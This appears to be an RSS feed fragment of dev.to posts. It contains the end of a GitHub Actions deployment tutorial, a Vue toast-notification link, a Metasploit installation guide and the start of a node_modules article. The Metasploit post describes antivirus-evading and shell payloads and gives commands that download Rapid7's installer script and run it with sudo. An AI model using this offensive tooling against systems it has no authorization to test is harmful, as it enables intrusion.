&lt;p&gt;&lt;strong&gt;7.)&lt;/strong&gt; We move into this &lt;em&gt;build&lt;/em&gt; directory and actually build the app (a &lt;a href="https://nuxtjs.org/"&gt;Nuxt.js&lt;/a&gt; app by the way), after setting some environment variables. Then we move back to the parent directory:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L32-L41"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L32-L41&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; Exported environment variables are not persistent across jobs/steps and are not to be confused with the &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#env"&gt;workflow’s env vars&lt;/a&gt; (line 9), which are available throughout the entire workflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8.)&lt;/strong&gt; Now we checkout the &lt;em&gt;app-dev&lt;/em&gt; repository to a &lt;em&gt;deploy&lt;/em&gt; directory, this time also providing a personal access token as a secret. This allows as to push changes to that repository in the next step:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L43-L48"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L43-L48&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;9.)&lt;/strong&gt; And then we simply copy the files from the &lt;em&gt;build&lt;/em&gt; directory to the &lt;em&gt;deploy&lt;/em&gt; directory, resulting in changes in the repository that we then need to commit and push:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L50-L58"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L50-L58&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L54-L55"&gt;Line 54 and 55&lt;/a&gt; add files needed for the GitHub Page to work properly. We disable Jekyll as GitHub’s default static site generator (we take care of that ourselves by using Nuxt) and we configure the domain we want to be connected to our development deployment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Done!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now isn’t that super easy and intuitive? :D I’m not claiming that this is the smartest and most efficient way of doing this. But I hope it’s comprehensible enough. Let’s move on to the production deployment.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-production-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Production Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Take a look at &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml"&gt;the workflow file&lt;/a&gt; and you will notice that it’s… pretty much the same. The only differences are &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L4"&gt;the branch this workflow “listens” to&lt;/a&gt;, &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L9"&gt;the deployment URL&lt;/a&gt;, &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L15"&gt;the environment&lt;/a&gt;, two of &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L37-L38"&gt;the env vars used when building the app&lt;/a&gt; and &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-prod.yml#L46"&gt;the deployment repository&lt;/a&gt;. The more significant difference however, is the environment’s configuration in the repository settings. It will allow this workflow to run only after an admin approved it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JabTscgm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A3n785G9UwGbmdJIzPmNYNg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JabTscgm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A3n785G9UwGbmdJIzPmNYNg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And I think that’s all there is to say about the production deployment and we can take a look at the most interesting part of all this. Pull requests.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-pull-request-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Pull Request Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Again, first go through &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml"&gt;the workflow file&lt;/a&gt;, try to make sense of it on your own and then I’ll just explain what’s different here.&lt;/p&gt;

&lt;p&gt;Most importantly there is no repository for this deployment yet. We have to create it from our workflow. To have a unique name for the repository, we fetch the GraphQL ID of the pull request:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L9-L10"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L9-L10&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; The &lt;code&gt;github&lt;/code&gt; variable lets you access the context of a workflow run, e.g. the event that triggered it, including the pull request object itself.&lt;/p&gt;

&lt;p&gt;There’s a separate job that creates the repository, using a special action I created:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L13-L21"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L13-L21&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can take a look at the action itself, to see what’s actually going on:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/mktcode/create-repository-action/blob/b1dd3b3dcdcc491795ae189db97383a47f04808e/index.js#L6-L29"&gt;https://github.com/mktcode/create-repository-action/blob/b1dd3b3dcdcc491795ae189db97383a47f04808e/index.js#L6-L29&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The next job depends on the repository being created and uses the &lt;em&gt;pr-staging&lt;/em&gt; environment:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L23-L28"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L23-L28&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;From there on it’s pretty much the same as the development and production workflow. The only thing missing is deleting the repository, once the pull request gets merged/closed. This is handled in &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/delete-deploy-pr.yml"&gt;a separate workflow&lt;/a&gt;. It uses &lt;a href="https://github.com/mktcode/delete-repository-action/blob/8e1765df0893c4555badce772bcd0b732e2770e3/index.js#L6-L17"&gt;another special action&lt;/a&gt; I created.&lt;/p&gt;

&lt;p&gt;An now you can have pull requests &lt;a href="https://github.com/OpenQDev/app/pull/134"&gt;like this one&lt;/a&gt; with their own automatic deployments to test the changed before merging.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DR8cZiS3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A9KXetmxMVHCfxfNiTwFxpQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DR8cZiS3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A9KXetmxMVHCfxfNiTwFxpQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;And that’s actually it! We’re done.&lt;/strong&gt; We now have a static site project, with multiple environments, living entirely on GitHub. And this is just one possible configuration of which I’m sure is far from perfect. In fact I am working on some improvements. So maybe I will update this article soon. But I hope you got a feeling for what’s possible with GitHub Actions and Workflows and that you start experimenting and creating your own ones for your own individual purposes now.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#thanks-for%C2%A0reading"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Thanks for reading!&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;You can follow me on&lt;/em&gt; &lt;a href="https://twitter.com/@thecodelander"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt; &lt;em&gt;and&lt;/em&gt; &lt;a href="https://github.com/mktcode"&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. For longer discussions, questions, feedback and so on, I just created a&lt;/em&gt; &lt;a href="https://discord.gg/vnGDEg9Ydv"&gt;&lt;em&gt;Discord Server&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. Not sure if that really makes sense but feel free to step by and say hello. :)&lt;/em&gt;&lt;/p&gt;

</description>
      <category>github</category>
      <category>githubpages</category>
      <category>githubactions</category>
      <category>programming</category>
    </item>
    <item>
      <title>Vue Js Toast Notification Example From Scratch</title>
      <author>techdurjoy</author>
      <pubDate>Fri, 25 Jun 2021 20:56:01 +0000</pubDate>
      <link>https://dev.to/techdurjoy/vue-js-toast-notification-example-from-scratch-2042</link>
      <guid>https://dev.to/techdurjoy/vue-js-toast-notification-example-from-scratch-2042</guid>
      <description>&lt;p&gt;Vue Notification Tutorial is the today’s main topic. In this example, I have used Vue Toasted One of the Best Toast plugin available for VueJS. It is responsive, touch compatible, easy to use, attractive and feature rich with icons, actions, etc. In this demo, when we save any data in the database, we will display a notification saying that item has successfully saved or if we show any error then we can show it. For the backend, we use Laravel PHP Framework.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.codecheef.org/article/vue-js-toast-notification-example-from-scratch"&gt;Vue Js Toast Notification Example From Scratch&lt;/a&gt;&lt;/p&gt;

</description>
      <category>vue</category>
      <category>toast</category>
    </item>
    <item>
      <title>[Cybersecurity &amp; Linux Tools] How to install Metasploit?</title>
      <author>Yuma-Tsushima </author>
      <pubDate>Fri, 25 Jun 2021 20:49:08 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</guid>
      <description>&lt;p&gt;Many people have been using this tool Metasploit. You came across on it on many tutorials and wondered how do you actually install this?&lt;br&gt;
Well I will guide your through!&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-the-purpose-of-metasploit-what-do-people-even-use-it-for"&gt;
  &lt;/a&gt;
  What is the purpose of Metasploit? What do people even use it for?
&lt;/h2&gt;

&lt;p&gt;The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it’s an open-source framework, it can be easily customized and used with most operating systems.&lt;/p&gt;

&lt;p&gt;With Metasploit, the pen testing team can use ready-made or custom code and introduce it into a network to probe for weak spots. As another flavour of threat hunting, once flaws are identified and documented, the information can be used to address systemic weaknesses and prioritize solutions.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#who-uses-metasploit"&gt;
  &lt;/a&gt;
  Who uses Metasploit?
&lt;/h2&gt;

&lt;p&gt;Due to its wide range of applications and open-source availability, Metasploit is used by everyone from the evolving field of DevSecOps pros to hackers. It’s helpful to anyone who needs an easy to install, reliable tool that gets the job done regardless of which platform or language is used. The software is popular with hackers and widely available, which reinforces the need for security professionals to become familiar with the framework even if they don’t use it.&lt;/p&gt;

&lt;p&gt;Metasploit now includes more than 1677 exploits organized over 25 platforms, including Android, PHP, Python, Java, Cisco, and more. The framework also carries nearly 500 payloads, some of which include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Command shell payloads that enable users to run scripts or random commands against a host&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Dynamic payloads that allow testers to generate unique payloads to evade antivirus software&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Meterpreter payloads that allow users to commandeer device monitors using VMC and to take over sessions or upload and download files&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Static payloads that enable port forwarding and communications between networks&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#how-to-install-metasploit"&gt;
  &lt;/a&gt;
  How to install Metasploit?
&lt;/h2&gt;

&lt;p&gt;Now we have read the background information. You are ready to install!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;apt update
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt dist-upgrade
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt autoremove


&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; msfinstall

&lt;span class="nb"&gt;chmod&lt;/span&gt; +x msfinstall
&lt;span class="nb"&gt;sudo&lt;/span&gt; ./msfinstall

msfdb init

msfconsole

&lt;span class="nb"&gt;sudo &lt;/span&gt;msfupdate
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>security</category>
      <category>linux</category>
      <category>tooling</category>
    </item>
    <item>
      <title>2 Birds, 1 Stone – 10 Apps, 1 Node</title>
      <author>Ryo Light (Pulkit)</author>
      <pubDate>Fri, 25 Jun 2021 20:36:32 +0000</pubDate>
      <link>https://dev.to/coffeelessprogrammer/2-birds-1-stone-10-apps-1-node-1ome</link>
      <guid>https://dev.to/coffeelessprogrammer/2-birds-1-stone-10-apps-1-node-1ome</guid>
      <description>&lt;h2&gt;
  &lt;a href="#a-better-way-to-nodemodules-via-symlinking"&gt;
  &lt;/a&gt;
  A Better Way to Node_Modules via Symlinking
&lt;/h2&gt;




&lt;h3&gt;
  &lt;a href="#prerequisites"&gt;
  &lt;/a&gt;
  Prerequisites:
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;A basic understanding of the 'node_modules' directory&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dev.to/leoat12/the-nodemodules-problem-29dc"&gt;The 'node_modules' problem | Leoat12 | Dev.to&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#refresher"&gt;
  &lt;/a&gt;
  Refresher:
&lt;/h4&gt;

&lt;ul&gt;
